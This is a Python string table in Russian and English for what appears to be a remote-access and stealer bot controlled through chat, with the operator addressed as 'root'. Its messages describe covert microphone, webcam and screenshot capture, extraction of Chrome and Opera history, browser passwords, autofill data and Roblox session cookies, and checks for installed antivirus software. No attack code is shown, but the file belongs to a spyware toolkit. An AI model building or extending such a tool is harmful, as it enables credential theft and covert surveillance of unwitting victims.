# Languages
user_languages = {}

TEXTS = {
    'ru': {
        'ask_duration': "Укажите длительность записи в секундах",
        'invalid': "Пожалуйста, укажите правильную длительность в секундах",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",
        "access_denied": "К сожалению, у вас нет доступа к этому боту.",
        "recording_started": "Начало записи...",
        "recording_finished": "Запись завершена.",
        "audio_ready": "Вот запись аудио, root!",
        "file_send_error": "Ошибка при отправке файла:",
        "screenshot_start": "Сейчас будет, root",
        "screenshot_error": "Ошибка при отправке скриншота: {error}",

        "enter_mp3_path": "Введите полный путь к MP3-файлу (например: `/home/user/music/mysound.mp3`):",
        "invalid_mp3": "Файл не существует или это не MP3. Попробуйте снова через команду.",
        "playing_sound": "Звук воспроизводится, root!",
        "play_error": "Ошибка при воспроизведении файла: {error}",

        "no_access": "К сожалению, у вас нет доступа к этому боту.",
        "snapshot_start": "Сейчас будет, root",
        "camera_open_error": "Не удалось открыть камеру, возможно она занята другим процессом.",
        "snapshot_error": "Не удалось сделать снимок, возможно камера занята другим процессом.",
        "snapshot_sent": "Вот ваше фото с веб-камеры, root",
        "snapshot_exception": "Произошла ошибка при попытке сделать фото: {error}",

        "ask_webcam_duration": "Укажите длительность записи в секундах, root",
        "invalid_duration": "Пожалуйста, укажите правильную длительность в секундах.",
        "recording_started": "Запись началась, root",
        "camera_busy": "Камера занята другим процессом.",
        "video_ready": "Вот запись с вебки!",
        "video_error": "Ошибка при записи видео:",
        "file_delete_error": "Не удалось удалить файл",

        "no_autofill_data": "Автозаполнения не найдены.",

        "access_denied": "К сожалению, у вас нет доступа к этому боту.",
        "chrome_history_start": "Получение истории Chrome. Пожалуйста, подождите...",
        "chrome_history_not_found": "Файл истории Chrome не найден. Возможно, браузер Chrome не установлен.",
        "invalid_time": "Некорректное время",
        "error_time": "Ошибка",
        "chrome_history_filename": "История_Хрома.txt",
        "chrome_history_caption": "Вот ваш файл, root!",
        "chrome_history_send_error": "Ошибка при отправке файла",

        "access_denied": "К сожалению, у вас нет доступа к этому боту.",
        "opera_history_start": "Получение истории Opera. Пожалуйста, подождите...",
        "opera_history_not_found": "Файл истории Opera не найден. Возможно, браузер Opera не установлен.",
        "invalid_time": "Некорректное время",
        "error_time": "Ошибка",
        "opera_history_filename": "История_Оперы.txt",
        "opera_history_caption": "Вот ваш файл!",
        "opera_history_send_error": "Ошибка при отправке файла",

        "browser_passwords_start": "Получение паролей браузеров. Пожалуйста, подождите...",
        "browser_passwords_nothing_found": "Ничего не найдено.",
        "browser_passwords_file_caption": "Список паролей браузеров",
        "browser_passwords_file_name": "browser_passwords.txt",
        "firefox_password_note": "Пароли зашифрованы, требуется дополнительное расшифрование.",

        "robloxcookie_start": "Ищу ROBLOSECURITY куки...",
        "robloxcookie_not_found": "Не удалось найти ROBLOSECURITY куки.",

        "antivirus_warning": "При сканировании возможна детекция антивирусами, используйте на свой страх и риск.",
        "antivirus_found": "Установленные антивирусные программы: ",
        "antivirus_not_found": "Антивирусные программы не обнаружены.",
        "antivirus_done": "Проверка завершена, root.",
        "antivirus_cancelled": "Отменено пользователем.",
        "antivirus_cancel_msg": "Проверка антивирусов отменена.",
        "antivirus_error": "Произошла ошибка при проверке антивирусов: {error}",

        
        
    },
    'en': {
        'ask_duration': "Enter recording duration in seconds",
        'invalid': "Please enter a valid duration in seconds",
        'no_access': "You do not have access to this bot.",
        "access_denied": "You do not have access to this bot.",
        "recording_started": "Recording started...",
        "recording_finished": "Recording finished.",
        "audio_ready": "Here is the audio recording, root!",
        "file_send_error": "Error sending file:",
        "screenshot_start": "Taking screenshot now, root...",
        "screenshot_error": "Error sending screenshot: {error}",

        "enter_mp3_path": "Enter the full path to the MP3 file (e.g., `/home/user/music/mysound.mp3`):",
        "invalid_mp3": "The file does not exist or is not an MP3. Try again with the command.",
        "playing_sound": "The sound is playing, root!",
        "play_error": "Error playing the file: {error}",

        "no_access": "You do not have access to this bot.",
        "snapshot_start": "One moment, root.",
        "camera_open_error": "Could not open the camera, it might be used by another process.",
        "snapshot_error": "Could not take a snapshot, the camera might be busy.",
        "snapshot_sent": "Here’s your webcam photo, root!",
        "snapshot_exception": "An error occurred while taking the photo: {error}",

        "ask_webcam_duration": "Specify the recording duration in seconds, root",
        "invalid_duration": "Please enter a valid duration in seconds.",
        "recording_started": "Recording started, root",
        "camera_busy": "The camera is busy with another process.",
        "video_ready": "Here is the webcam recording!",
        "video_error": "Error recording video:",
        "file_delete_error": "Failed to delete file",

        "no_autofill_data": "No autofill data found.",

        "access_denied": "Access denied.",
        "chrome_history_start": "Getting Chrome history. Please wait...",
        "chrome_history_not_found": "Chrome history file not found. Is Chrome installed?",
        "invalid_time": "Invalid time",
        "error_time": "Error",
        "chrome_history_filename": "Chrome_History.txt",
        "chrome_history_caption": "Here is your Chrome history, root!",
        "chrome_history_send_error": "Error sending file",

        "access_denied": "Access denied.",
        "opera_history_start": "Getting Opera history. Please wait...",
        "opera_history_not_found": "Opera history file not found. Is Opera installed?",
        "invalid_time": "Invalid time",
        "error_time": "Error",
        "opera_history_filename": "Opera_History.txt",
        "opera_history_caption": "Here is your Opera history, root!",
        "opera_history_send_error": "Error sending file",

        "browser_passwords_start": "Getting browser passwords. Please wait...",
        "browser_passwords_nothing_found": "Nothing found.",
        "browser_passwords_file_caption": "Browser passwords list",
        "browser_passwords_file_name": "browser_passwords.txt",
        "firefox_password_note": "Passwords are encrypted, additional decryption required.",

        "robloxcookie_start": "Searching for ROBLOSECURITY cookie...",
        "robloxcookie_not_found": "Could not find ROBLOSECURITY cookie.",

        "antivirus_warning": "Antivirus scan may trigger detections, use at your own risk.",
        "antivirus_found": "Installed antivirus products: ",
        "antivirus_not_found": "No antivirus products detected.",
        "antivirus_done": "Scan completed, root.",
        "antivirus_cancelled": "Cancelled by user.",
        "antivirus_cancel_msg": "Antivirus scan cancelled.",
        "antivirus_error": "An error occurred during antivirus scan: {error}"
    }
}